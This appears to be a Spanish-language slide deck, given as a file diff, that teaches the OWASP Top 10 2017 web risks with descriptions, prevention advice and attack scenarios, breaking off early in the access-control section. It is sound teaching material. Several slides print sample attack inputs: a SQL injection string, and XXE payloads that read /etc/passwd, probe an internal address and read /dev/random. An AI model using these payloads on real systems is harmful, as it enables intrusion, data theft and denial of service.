@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" type="text/css" href="../estilos/estilos.css">
+    <link rel="stylesheet" href="../estilos/jqmath-0.4.3.css">
+	
+	<script src="scripts/jquery-1.4.3.min.js"></script>
+	<script src="scripts/jqmath-etc-0.4.6.min.js" charset="utf-8"></script>
+	<!-- <script>M.MathPlayer = false; M.trustHtml = true;</script> -->
+  </head>
+  <body>
+    <textarea id="source">
+      name: inverse
+      layout: true
+      class: center, middle, inverse
+      ---
+      template: inverse
+      # Ataques y vulnerabilidades
+      
+      ---
+      layout: false
+      # Ataques y vulnerabilidades
+
+      ## Contenidos
+
+      ---
+      # Introducción al OWASP Top 10
+      
+      Uno de los principales objetivos del Top 10 de OWASP es educar sobre las consecuencias de las debilidades más comunes y más importantes de la seguridad de las aplicaciones web. 
+      
+      __El Top 10__ proporciona técnicas básicas para protegerse contra estas áreas problemáticas de alto riesgo, y proporciona orientación sobre cómo continuar desde ese punto. 
+      
+      ## Hoja de ruta:
+      
+      - El top ten es un inicio que debe ser solo el punto de partida, hay cientos de fallas que podrían afectar la seguridad general de una aplicación web.
+      
+      - No es solo perseguir vulnerabilidades: hay que centrarse en establecer fuertes controles de seguridad de aplicaciones.
+      
+      - Combinar de Herramientas y expertos: Las vulnerabilidades de seguridad pueden ser bastante complejas.  Confiar sólo en las herramientas proporciona una falsa sensación de seguridad y no se recomienda.
+      
+      - Enfóquese en hacer de la seguridad una parte integral de la cultura en su organización de desarrollo. 
+      
+      ---
+      # Introducción al OWASP Top 10
+
+      ## Cambios en el contexto tecnológico:
+
+      - Los __microservicios__ están reemplazando las aplicaciones monolíticas tradicionales. Los microservicios vienen con sus propios desafíos de seguridad, incluyendo el establecimiento de confianza entre microservicios, contenedores, gestión de secretos, etc. 
+      
+      - El antiguo código que nunca esperó ser accesible desde Internet se encuentra ahora detrás de un API o servicio REST esperando a ser consumido por aplicaciones de una sola página (SPAs) y aplicaciones móviles. 
+      
+      - Supuestos arquitectónicos realizados al codificar, como las llamadas confiables, ya no son válidas.
+      
+      - Las aplicaciones de una sola página, permiten la creación de interfaces de usuario altamente modulares y ricos en funciones. 
+      
+      - Funcionalidades en el lado del cliente que tradicionalmente se han implementado en el  servidor, traen consigo sus propios desafíos de seguridad.
+      
+      ---
+      # Riesgo - Riesgos en Seguridad de Aplicaciones
+
+      ## ¿Qué son los riesgos en seguridad de aplicaciones?
+      
+      - Los atacantes potencialmente pueden utilizar distintas rutas a través de su aplicación para perjudicar a su negocio u organización. 
+      - Cada uno de estos caminos representa un riesgo que puede o no ser suficientemente grave como para merecer atención. 
+      
+      ![App Security Risks](images/0x10-risk-1.png)
+
+      ---
+      # Riesgo - Riesgos en Seguridad de Aplicaciones
+
+      ## ¿Qué son los riesgos en seguridad de aplicaciones?
+      
+      - A veces, estos caminos son triviales de encontrar y explotar, mientras que otras son extremadamente difíciles. 
+      - De la misma manera, el perjuicio ocasionado puede no tener consecuencias, o puede dejarlo en la quiebra. 
+      - A fin de determinar el riesgo para su organización, puede evaluar la probabilidad asociada a cada agente de amenaza, vector de ataque, debilidad de seguridad y combinarlo con una estimación del impacto técnico y de negocio para su organización. 
+      - Juntos, estos factores determinan su riesgo general.
+
+      El [OWASP Top 10](https://www.owasp.org/index.php/Top10) se enfoca en identificar los riesgos más críticos para un amplio espectro de organizaciones. Para cada uno de éstos riesgos, se proporciona información genérica sobre la probabilidad y el impacto técnico
+
+      ---
+      # Riesgo - Riesgos en Seguridad de Aplicaciones
+
+      ## ¿Qué son los riesgos en seguridad de aplicaciones?
+
+      - Cada organización es única, y también lo son los actores de la amenaza para esa organización, sus objetivos y el impacto de cualquier brecha. 
+      - Si una organización de interés público utiliza un CMS para información pública y el sistema de salud utiliza el mismo CMS para datos sensibles, los agentes de amenaza y los impactos en el negocio son muy distintos para el mismo software. 
+      - Es fundamental que conozca sus propios sus agentes de amenazas y los impactos al negocio basados en la criticidad de los activos de datos.
+
+      ---
+      # T10 OWASP Top 10 2017 Riesgos en Seguridad de Aplicaciones
+      | Riesgo | Descripción |
+      | -- | -- |
+      | A1:2017 Inyección | Las defectos de inyecciones, como SQL, OS o LDAP ocurren cuando se envían datos no confiables a un intérprete como parte de un comando o consulta. Los datos hostiles del atacante pueden engañar al intérprete para que ejecute comandos involuntarios o acceda a los datos sin la debida autorización. |
+      | A2:2017 Pérdida de Autenticación | Las funciones de la aplicación relacionadas a autenticación y gestión de sesiones son frecuentemente implementadas incorrectamente, permitiendo a los atacantes comprometer contraseñas, claves, token de sesiones, o explotar otras fallas de implementación para asumir la identidad de otros usuarios (temporalmente o permanentemente). |
+      | A3:2017 Exposición de datos sensibles | Muchas aplicaciones web y APIs no protegen adecuadamente datos sensibles, tales como información financiera, de salud o información personalmente identificable (PII). Los atacantes pueden robar o modificar estos datos indebidamente protegidos para llevar a cabo fraudes con tarjetas de crédito, robos de identidad u otros delitos. Los datos sensibles requieren de métodos de protección adicionales tales como su cifrado al ser almacenados o transmitidos, así como precauciones especiales en un intercambio de datos con el navegador. |
+      
+      ---
+      # T10 OWASP Top 10 2017 Riesgos en Seguridad de Aplicaciones
+      | Riesgo | Descripción |
+      | -- | -- |
+      | A4:2017 Entidad Externa de XML (XXE) | Muchos procesadores XML antiguos o mal configurados evalúan referencias de entidades externas en documentos XML. Las entidades externas se pueden utilizarse para revelar archivos internos utilizando el gestor de archivos URI, compartir archivos SMB internos en servidores Windows no actualizados, escanear de puertos internos, ejecución remota de código y ataques de denegación de servicio, como lo es el ataque Billion Laughs. |
+      | A5:2017 Pérdida de Control de Acceso | Las restricciones sobre lo que los usuarios autenticados pueden hacer no se aplican correctamente. Los atacantes pueden explotar estos defectos para acceder a funcionalidades y/o datos no autorizados, tales como acceder a cuentas de otros usuarios, ver archivos sensibles, modificar datos de otros usuarios, cambiar derechos de acceso, etc. |
+      | A6:2017 Configuración de Seguridad Incorrecta | La configuracíon de seguridad incorrecta es el problema más común en los datos, lo cual se debe en parte a configuraciones manuales o ad hoc (o directamente la falta de configuración), configuraciones inseguras por omisión,  S3 buckets abiertos, cabeceras HTTP mal configuradas, mensajes de error con contenido sensible, no parchear o actualizar los sistemas, frameworks, dependencias y componentes de manera oportuna (o directamente no actualizarlos nunca). |
+
+      ---
+      # T10 OWASP Top 10 2017 Riesgos en Seguridad de Aplicaciones
+      | Riesgo | Descripción |
+      | -- | -- |
+      | A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS) | Defectos de XSS ocurren cada vez que una aplicación toma datos no confiables y los envía al navegador web sin una validación y codificación apropiada, o actualiza una página web existente con datos suministrados por el usuario utilizando una API que puede crear JavaScript en el navegador. Un XSS permite al atacante ejecutar secuencia de comandos en el navegador de la víctima los cuales pueden secuestrar las sesión de usuario, desfigurar al sitios web, o redireccionar al usuario hacia un sitio malicioso. |
+      | A8:2017 Deserialización Insegura | Defectos de deserialización insegura ocurren cuando una aplicación recibe objetos serializados hostiles. La deserialización insegura conduce a la ejecución remota del código. Incluso si el defecto de deserialización no resultara en la ejecución remota del código, los objetos serializados pueden ser reproducidos, manipulados o borrados por el atacante, realizar ataques de inyecciones o elevar sus privilegios. |
+      
+      ---
+      # T10 OWASP Top 10 2017 Riesgos en Seguridad de Aplicaciones
+      | Riesgo | Descripción |
+      | -- | -- |
+      | A9:2017 Utilización de componentes con vulnerabilidades conocidas | Componentes, tales como bibliotecas, frameworks y otros módulos de software,  ejecutan con los mismos privilegios que la aplicación. Si se explota un componente vulnerable, el ataque puede provocar una pérdida grave de datos o la toma de control del servidor. Las aplicaciones y API que utilizan componentes con vulnerabilidades conocidas pueden socavar las defensas de las aplicaciones y permitir diversos ataques e impactos. |
+      | A10:2017 Registro y Monitoreo Insuficientes | El registro y monitoreo insuficiente, junto con la falta o integración inefectiva de respuesta de incidentes permiten a los atacantes persistir en el tiempo el ataque al sistema, pivotear a más sistemas y manipular, extraer o destruir datos. La mayoría de los estudios muestran que el tiempo de detección de una violación de seguridad es mayor a 200 días, siendo típicamente detectado por terceros en lugar de procesos internos o monitoreo. |
+      
+      ---
+      # A1:2017 Inyección
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - Casi cualquier fuente de datos puede ser un vector de inyección, variables de entorno, parámetros, servicios web externos e internos, y todo tipo de usuarios. 
+      - [Los defectos de inyección](http://www.owasp.org/index.php/Injection_Flaws) ocurren cuando un atacante puede enviar información hostil a un intérprete.
+
+      ## Debilidades de seguridad 
+      - Estos defectos son muy comunes, particularmente en código heredado. Las vulnerabilidades de inyección se encuentran a menudo en consultas SQL, LDAP, XPath, o NoSQL, comandos OS, analizadores XML, encabezados SMTP, lenguajes de expresión y consultas ORM. 
+      - Los defectos de inyección son fáciles de descubrir al examinar el código. 
+      - Los escáneres y los fuzzers pueden ayudar a los atacantes a encontrar defectos de inyecciones.
+
+      ---
+      # A1:2017 Inyección
+
+      ## Impactos
+      
+      - Una inyección puede causar divulgación, pérdida o corrupción de datos, pérdida de auditabilidad, o negación de acceso. 
+      - El impacto del negocio depende de las necesidades de la aplicación y de los datos.
+      
+      ---
+      # A1:2017 Inyección
+
+      ## ¿La aplicación es vulnerable?
+      
+      Una aplicación es vulnerable a ataque cuando:
+      
+      * Los datos suministrados por el usuario no son validados, filtrados o sanitizados por la aplicación.
+      * Se invocan consultas dinámicas o no paremitrizadas sin codificar sus parámetros de forma acorde al contexto.
+      * Datos hostiles se utilizan dentro de los parámetros de búsqueda en consultas object-relational mapping (ORM) para extraer registros adicionales y sensibles.
+      * Datos hostiles se utilizan o concatenan directamente, de manera que el SQL o comando contiene tanto datos de estructura como hostiles en consultas dinámicas, comandos o procedimientos almacenados.
+
+      ---
+      # A1:2017 Inyección
+      
+      ## ¿La aplicación es vulnerable?
+
+      * Algunas de las inyecciones más comunes son SQL, NoSQL, comando OS, Object Relational Mapping (ORM), LDAP y Expresiones del Language (EL), o la inyección de la Biblioteca de Navegación Gráfica de Objetos (OGNL). 
+      * El concepto es idéntico entre todos los intérpretes. 
+      * La revisión del código fuente es el mejor método para detectar si las aplicaciones son vulnerables a inyecciones, seguido de cerca por pruebas automatizadas  de todos los parámetros, encabezados, URL, cookies, JSON, SOAP y entradas de datos XML. 
+      * Las organizaciones pueden incluir herramientas de análisis estático ([SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools]) y pruebas dinámicas ([DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools)) en su pipeline de CI/CD para identificar defectos de inyecciones recientemente introducidas antes de su despliegue en producción.
+      
+      ---
+      # A1:2017 Inyección
+      
+      ## Cómo se previene
+      
+      Para prevenir inyecciones, se requiere separar los datos de los comandos y las consultas.
+      
+      * La opción preferida es utilizar una API segura, que evite el uso un intérprete en su totalidad o proporcione una interfaz parametrizada, o migrar a utilizar una Herramientas de Mapeo Relacional de Objetos (ORMs). 
+      > Incluso cuando se parametrizan, los procedimientos almacenados pueden introducir una inyección SQL si el procedimiento PL/SQL o T-SQL concatena consultas y datos, o ejecuta datos hostiles utilizando EXECUTE IMMEDIATE o exec().
+      * Utilizar validaciones de las entrada de datos en el servidor utilizando "listas blancas". 
+      * Esto no es una defensa completa ya que muchas aplicaciones requieren caracteres especiales en sus entradas, como campos de texto o APIs para aplicaciones móviles.
+
+      ---
+      # A1:2017 Inyección
+      
+      ## Cómo se previene
+
+      * Para cualquier consulta dinámica residual, escape caracteres especiales utilizando la sintaxis de escape de caracteres específica para ese intérprete. 
+      > La estructuras de SQL como nombres de tabla, nombres de columna, etc. no se puede escapar y, por lo tanto, los nombres de estructura suministrados por el usuario son peligrosos. Este es un problema común en el software de redacción de informes.
+      * Utilice ___LIMIT___ y otros controles SQL dentro de las consultas para evitar la divulgación masiva de registros en caso de inyección de SQL.
+      
+      ---
+      # A1:2017 Inyección
+      
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #1**: 
+
+      La aplicación utiliza datos no confiables en la construcción del siguiente llamado de SQL vulnerable:
+      
+      `String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";`
+      
+      **Escenario #2**: 
+
+      En forma similar, la confianza total de una aplicación en su framework puede resultar en consultas que aún son vulnerables a inyección (por ejemplo Hibernate Query Language (HQL)):
+      
+      `Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");`
+      
+      ---
+      # A1:2017 Inyección
+      
+      ## Ejemplos de escenarios de ataque
+
+      * En ambos casos, al atacante modificar el parametro 'id' en su navegador para enviar:  ' or '1'='1. 
+      
+      Por ejemplo:
+      
+      `http://example.com/app/accountView?id=' or '1'='1`
+
+      * Esto cambia el significado de ambas consultas retornando todos los registro de la tabla "accounts". 
+      
+      * Ataques más peligrosos pueden modificar datos o incluso invocar procedimientos almacenados.
+      
+      ---
+      # A2:2017 Pérdida de Autenticación
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - Los atacantes tienen acceso a cientos de millones de combinaciones de pares de usuario y contraseña conocidas (debido a fugas de información) para el ingreso de credenciales, además de listas de cuentas administrativas por defecto, ataques mediante herramientas de fuerza bruta o diccionario y herramientas avanzadas para romper hashes de contraseñas.
+
+      ## Debilidades de seguridad
+      - La prevalencia de la pérdida de autenticación es difundida debido al diseño y la implementación de la mayoría de los sistemas de identificación y gestión de acceso. 
+      - Los atacantes pueden detectar la pérdida de autenticación de forma manual, pero se ven más atraídos por los volcados de contraseñas, los ataques de ingeniería social como el phishing.
+
+      ---
+      # A2:2017 Pérdida de Autenticación
+
+      ## Impactos      
+      - Los atacantes solo tienen que obtener el acceso a unas pocas cuentas o solo a alguna cuenta de administrador para comprometer el sistema. 
+      - Dependiendo del dominio de la aplicación, esto puedo permitir lavado de dinero y robo de identidad; o la divulgación de información sensible protegida legalmente.
+      
+      ---
+      # A2:2017 Pérdida de Autenticación
+
+      ## ¿La aplicación es vulnerable?
+      
+      La confirmación de la identidad, la autenticación y la gestion de sesiones del usuario son fundamental para protegerse contra ataques relacionados con la autenticación.
+      
+      Puede existir debilidades de autenticación si la aplicación:
+      
+      * Permite ataques automatizados como la [reutilización de credenciales conocidas](https://www.owasp.org/index.php/Credential_stuffing), cuando el atacante posee una lista de pares de usuario y contraseña válidos.
+      * Permite ataques de fuerza bruta u otros ataques automatizados.
+      * Permite contraseñas por defecto, débiles o bien conocidas, como "Password1", "Contraseña1" o "admin/admin".
+      * Posee procesos débiles o inefectivos para el olvido de contraseña o recuperación de credenciales, como "respuestas basadas en el conocimiento", las cuales no se pueden implementar de forma segura.
+
+      ---
+      # A2:2017 Pérdida de Autenticación
+      
+      ## ¿La aplicación es vulnerable?
+      
+      * Almacena las contraseñas en texto claro, cifradas o utilizando funciones de hash débiles (vea **A3:2017-Exposición de Datos Sensiblese**)..
+      * No posee una autenticación multi-factor  o la implementada es ineficaz.
+      
+      ---
+      # A2:2017 Pérdida de Autenticación
+      
+      ## Cómo se previene
+      
+      * Cuando sea posible, implemente la autenticación multifactorial para evitar ataques automatizados, de relleno de credenciales, fuerza bruta o reuso de credenciales robadas. 
+      * No incluya o implemente en su software credenciales por defecto, particularmente para administradores.
+      * Implemente un control contra contraseñas débiles, tal como verificar que una nueva contraseña o un cambio de contraseña no esté incluída en la lista del [top 10000 de peores contraseñas](https://github.com/danielmiessler/SecLists/tree/master/Passwords).
+      * Alinear las políticas de largo, complejidad y rotación de las contraseñas con las [pautas de la sección 5.1.1 para Secretos Memorizados de la guía NIST 800-63 B's](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) u otras políticas de contraseñas modernas, basadas en evidencias.
+
+      ---
+      # A2:2017 Pérdida de Autenticación
+      
+      ## Cómo se previene
+      
+      * Asegúrese que el registro, la recuperación de las credenciales y el uso de APIs, no permiten los ataques de enumeración de usuarios, mediante la utilización de los mismos mensajes genéricos en todas las salidas.
+      * Limite o incremente el tiempo de respuesta de cada intento fallido de inicio de sesión. 
+      * Registre todos los fallos y avise a los administradores cuando se detecten rellenos de credenciales, fuerza bruta u otros ataques.
+      * Utilice un gestor de sesión en el servidor, integrado, seguro y que genera un nuevo ID de sesión aleatorio con alta entropía después de iniciar sesión. 
+      * Los identificadores de sesión no deben incluirse en la URL, deben almacenarse de forma segura y ser invalidados después del cierre de sesión,  un tiempo de inactividad y un tiempo tiempo de espera absoluto.
+      
+      ---
+      # A2:2017 Pérdida de Autenticación
+      
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #1**: 
+      
+      * [Relleno de credenciales](https://www.owasp.org/index.php/Credential_stuffing), el uso de [listas de contraseñas conocidas](https://github.com/danielmiessler/SecLists), es un ataque común. 
+      * Si una aplicación no implementa protecciones automáticas de amenazas o rellenado de credenciales, la aplicación puede usarse como oráculo de contraseña para determinar si las credenciales son válidas.
+      
+      **Escenario #2**: 
+      
+      * La mayoría de los ataques de autenticación ocurren debido al uso de contraseñas como único factor. 
+      * Las consideradas mejores prácticas de requerir de una rotación y complejidad de las contraseñas, son vistos como alentadoras del uso y reúso de contraseñas débiles por parte de los usuarios. 
+      * Se le recomienda a las organizaciones que detengan dichas prácticas y utilicen las prácticas recomendadas en la guía NIST 800-63 y el uso de la autenticación multi-factor.
+
+      ---
+      # A2:2017 Pérdida de Autenticación
+      
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #3**: 
+      * Los tiempos de vida de las sesiones de aplicación no están configurados correctamente. 
+      * Un usuario utiliza una computadora pública para acceder a una aplicación. 
+      * En lugar de seleccionar "logout", el usuario simplemente cierra la pestaña del navegador y se aleja. 
+      * Un atacante usa el mismo navegador una hora más tarde, y el usuario continúa autenticado.
+      
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - En lugar de atacar directamente la criptografía, los atacantes roban claves, ejecutan ataques de intermediarios (Man in the Middle) o roban datos en texto plano del servidor, mientras se encuentran en tránsito, o del cliente (por ejemplo del navegador). 
+      - Generalmente se requiere un ataque manual. 
+      - Incluso, bases de datos con contraseñas que han sido hechas públicas pueden utilizarse para obtener las contraseñas originales utilizando GPUs (Unidades de Procesamiento Gráfico)
+      
+      ## Debilidades de seguridad
+      - En los últimos años, este ha sido el ataque más común de gran impacto. 
+      - El defecto más común es simplemente no cifrar datos sensibles. 
+      - Cuando se emplea criptografía, es común la generación y gestión de claves débiles o el uso de algoritmos, cifradores y protocolos débiles, en particular técnicas débiles de hashing para el almacenamiento de contraseñas. 
+
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+
+      ## Debilidades de seguridad
+      - Para los datos en tránsito las debilidades son fáciles de detectar, mientras que para los datos almacenados es muy difícil. Ambos con una explotabilidad muy variable.
+
+      ## Impactos       
+      - Los fallos con frecuencia comprometen todos los datos que deberían estar protegidos. 
+      - Típicamente, esta información incluye información personal sensible (PII) como registros de salud, credenciales, datos personales, tarjetas de crédito, que a menudo requiere protección según lo definido por las leyes o reglamentos como el PIBR de la UE o las leyes locales de privacidad.
+
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+      
+      ## ¿La aplicación es vulnerable?
+      
+      Lo primero es determinar las necesidades de protección de los datos en tránsito y en almacenamiento. 
+      
+      Por ejemplo, _contraseñas_, _números de tarjetas de crédito_, _registros médicos_, _información personal_ y _datos sensibles del negocio_ requieren una protección adicional, especialmente si dichos datos se encuentran en el ámbito de aplicación de leyes de privacidad, como por ejemplo el Reglamento General de Protección de Datos de la UE (GDPR) o regulaciones como por ejemplo financieras, como PCI Data Security Standard (PCI DSS). 
+      
+      Para todos estos datos:
+      
+      * ¿Se transmite algún dato en texto claro? Esto se refiere a protocolos como HTTP, SMTP y FTP. 
+      * El tráfico en Internet es especialmente peligroso. 
+      * Verifique también todo el tráfico interno, por ejemplo, entre los balanceadores de carga, servidores web o sistemas backend.
+
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+      
+      ## ¿La aplicación es vulnerable?
+      
+      * ¿Se utilizan algoritmos criptográficos antiguos o débiles, ya sea por defecto o en código antiguo?
+      * ¿Se utilizan claves criptográficas predeterminadas, se generan o reutilizan claves criptográficas débiles, o falta una gestión o rotación adecuada de las claves?
+      * ¿No se aplica el cifrado, por ejemplo, no se han configurado alguna de las directivas de seguridad o encabezados para el navegador?
+      * ¿El Agente del usuario (aplicación o cliente de correo electrónico, por ejemplo), verifica que el certificado enviado por el servidor se válido?
+      
+      Véase también [criptografía en el almacenamiento (V7)](https://www.owasp.org/index.php/ASVS_V7_Cryptography), [protección de datos (V9)](https://www.owasp.org/index.php/ASVS_V9_Data_rotection) y [seguridad de la comunicaciones (V10)](https://www.owasp.org/index.php/ASVS_V10_Communications) del ASVS.
+      
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+
+      ## Cómo se previene
+      
+      Realice como mínimo las siguientes recomendaciones y consulte las referencias:
+      
+      * Clasificar los datos procesados, almacenados o transmitidos por el sistema. 
+      * Identifique qué información es sensible de acuerdo a las regulaciones, leyes o requisitos del negocio.
+      * Aplicar los controles para cada clasificación.
+      * No almacene datos sensibles innecesariamente. Descártelos tan pronto como sea posible o utilice un sistema de tokens que cumpla con PCI DSS. Datos que no son retenidos no pueden ser robados.
+      * Asegúrese de cifrar todos los datos sensibles cuando son almacenados.
+      * Asegúrese de que se utilizan únicamente algoritmos y protocolos estándares  y fuertes, así como que para las claves se implementa una gestión adecuada.
+
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+
+      ## Cómo se previene
+
+      * Cifre todos los datos en tránsito utilizando protocolos seguros como TLS con cifradores que utilicen perfect forward secrecy (PFS), priorización de cifradores por el servidor y parámetros seguros. 
+      * Aplique el cifrado utilizando directivas como HTTP Strict Transport Security (HSTS).
+      * Almacene contraseñas utilizando funciones de hashing adaptables con un factor de trabajo (factor de retraso) además de sal, como [Argon2](https://www.cryptolux.org/index.php/Argon2), [scrypt](https://wikipedia.org/wiki/Scrypt),[bcrypt](https://wikipedia.org/wiki/Bcrypt) o [PBKDF2](https://wikipedia.org/wiki/PBKDF2).
+      * Verifique la efectividad de sus configuraciones y parámetros de forma independiente.
+
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+
+      
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #1**:  
+      - Una aplicación cifra números de tarjetas de crédito en una base de datos utilizando el cifrado automática de la base de datos. 
+      - Sin embargo, estos datos son automáticamente decifrados al ser consultados, permitiendo que a través de un defecto de inyección SQL se obtengan los números de tarjetas de crédito en texto plano. 
+      
+      **Escenario #2**: 
+      - Un sitio web no utiliza o fuerza el uso de TLS para todas las páginas, o utiliza cifradores débiles. 
+      - Un atacante monitorea el tráfico de la red (por ejemplo en una red WiFi insegura), degrada la conexión de HTTPs a HTTP e intercepta los pedidos, robando las cookies de sesión del usuario. 
+      - El atacante reutiliza esta cookie y secuestra la sesión del usuario (autenticado), accediendo o modificando datos privados. 
+
+      ---
+      # A3:2017 Exposición de Datos Sensibles
+
+      
+      ## Ejemplos de escenarios de ataque
+
+      **Escenario #2**: 
+      - Por otro lado, podría alterar los datos transportados, por ejemplo, el receptor de una transferencia monetaria.
+      
+      **Escenario #3**: 
+      - Se utilizan hashes simples o hashes sin sal para almacenar las contraseñas de los usuarios en una base de datos. 
+      - Una falla en la carga de archivos permite a un atacante obtener la base de datos de contraseñas. 
+      - Utilizando una Rainwbow table de valores pre calculados, se pueden recuperar las contraseñas originales.
+
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - Atacantes pueden explotar  procesadores XML vulnerables si pueden cargar XMLs o incluir contenido hostil en un documento XML, explotando código vulnerable, dependencias o integraciones. 
+      
+      ## Debilidades de seguridad 
+      - De forma predeterminada, muchos procesadores XML antiguos permiten la especificación de una entidad externa, una URI que se dereferencia y evalúa durante el procesamiento XML. 
+      - Las herramientas [SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools) pueden descubrir estos problemas inspeccionando las dependencias y la configuración. 
+      -Las herramientas [DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) requieren pasos manuales adicionales para detectar y explotar estos problemas. 
+      - Los testers necesitan ser entrenados en cómo hacer pruebas para el XXE, ya que no eran comúnmente probados antes de 2017. 
+      
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## Impactos
+      - Estos defectos se pueden utilizar para extraer datos, ejecutar una solicitud remota desde el servidor, escanear sistemas internos, realizar un ataque de denegación de servicio y ejecutar otros ataques.
+
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## ¿La aplicación es vulnerable?
+      
+      Aplicaciones y en particular servicios web basados en XML o integraciones que utilicen XML pueden ser vulnerables al ataque si:
+      
+      * La aplicación acepta XML directamente o carga XML, especialmente de fuentes no confiables, o inserta datos no confiables en documentos XML, los cuales son entonces analizados sintácticamente por un procesador XML.
+      * Cualquiera de los procesadores XML en la aplicación o servicios web basados en SOAP poseen habilitadas las [definiciones de tipo de documento (DTDs)](https://en.wikipedia.org/wiki/Document_type_definition). 
+      * Dado que los mecanismos exactos para deshabilitar el procesamiento de DTDs varía por procesador, se recomienda consultar una referencia como la [Hoja de ayuda para Prevención de XXE de OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet).
+
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## ¿La aplicación es vulnerable?
+
+      * Si la aplicación utiliza SAML para el procesamiento de identidades dentro de la seguridad federada o para propósitos de single sign on (SSO). 
+      * SAML utiliza XML para aseveraciones de identidad, pudiendo ser vulnerable.
+      * Si su aplicación utiliza SOAP en versión previa a la 1.2, es probablemente susceptible a ataques XXE si las entidades XML son pasadas a la infraestructura SOAP.
+      * Ser vulnerable a ataques XXE significa que probablemente la aplicación es vulnerable a ataques de denegación de servicio incluyendo el ataque de Mil Millones de Risas.
+      
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## Cómo se previene
+      
+      El entrenamiento del desarrollador es esencial para identificar y mitigar defectos de XXE. Aparte de esto, prevenir XXE requiere:
+      
+      * De ser posible, utilice formatos de datos menos complejos como JSON y evite la serialización de datos confidenciales.
+      * Parchee o actualice todos los procesadores y bibliotecas XML que utilice la aplicación o el sistema operativo subyacente. 
+      * Utilice validadores de dependencias. 
+      * Actualice SOAP a 1.2 o superior.
+      * Deshabilitar entidades externas de XML y procesamiento DTD en todos los analizadores sintácticos XML en su aplicación, según se indica en la [Hoja de Ayuda Para Prevención de XXE de OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet).
+      * Implementar validación de entrada positiva ("lista blanca"), filtrado, o sanitización para prevenir datos hostiles dentro de documentos, cabeceras o nodos XML.
+
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## Cómo se previene
+      
+      * Verificar que la funcionalidad de carga de archivos XML o XSL valida el XML entrante usando validación XSD o similar.
+      * Herramientas SAST pueden ayudar a detectar XXE en el código fuente, aunque la revisión manual de código es la mejor alternativa en aplicaciones grandes y complejas con muchas integraciones.
+      
+      Si estos controles no son posibles, considere usar parcheo virtual, gateways de seguridad de API, o Firewalls de Aplicaciones Web (WAFs) para detectar, monitorear, y bloquear ataques XXE. 
+      
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## Ejemplos de escenarios de ataque
+      
+      - Numerosos XXE han sido publicados, incluyendo el ataque a dispositivos embebidos. 
+      - XXE ocurre en una gran cantidad de lugares inesperados, incluyendo dependencias profundamente anidadas. 
+      - La manera más fácil es cargar un archivo XML malicioso, si es aceptado:
+      
+      **Escenario #1**: 
+      
+      - El atacante intenta extraer datos del servidor:
+      
+      ```
+        <?xml version="1.0" encoding="ISO-8859-1"?>
+          <!DOCTYPE foo [
+          <!ELEMENT foo ANY >
+          <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+          <foo>&xxe;</foo>
+      ```
+      ---
+      # A4:2017 Entidad Externa de XML (XXE)
+
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #2**: 
+      - Un atacante sondea la red privada del servidor cambiando la linea ENTITY anterior por:
+      ```
+         <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
+      ```
+      
+      **Escenario #3**: 
+      - Un atacante intenta un ataque de denegación de servicio incluyendo un archivo potencialmente infinto:
+      
+      ```
+         <!ENTITY xxe SYSTEM "file:///dev/random" >]>
+      ```
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - La explotación del Control de Acceso es una habilidad central de los atacantes. 
+      - Las herramientas [SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools) y [DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) pueden detectar la ausencia de control de acceso, pero no verificar si es correcto en el caso de estar presente. 
+      - El control de acceso es detectable utilizando medios manuales, o posiblemente a través de la automatización por la ausencia de controles de acceso en ciertos frameworks.
+
+      ## Debilidades de seguridad 
+      - Las debilidades del control de acceso son comunes debido a la falta de detección automática y a la falta de pruebas funcionales efectivas por parte de los desarrolladores de aplicaciones. 
+      - La detección de fallas en el control de acceso no suele ser cubierto por pruebas automatizadas, tanto estáticas o dinámicas. 
+
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## Impactos
+      - El impacto técnico son los atacantes anónimos actuando como usuarios o administradores, los usuarios que utilizan funciones privilegiadas o crean, acceden, actualizan o eliminan cualquier registro. 
+      - El impacto al negocio depende de la protección necesaria por la aplicación o sus datos. 
+
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## ¿La aplicación es vulnerable?
+      
+      El control de acceso aplica la política de modo que los usuarios no puedan actuar fuera de los permisos previstos. 
+      
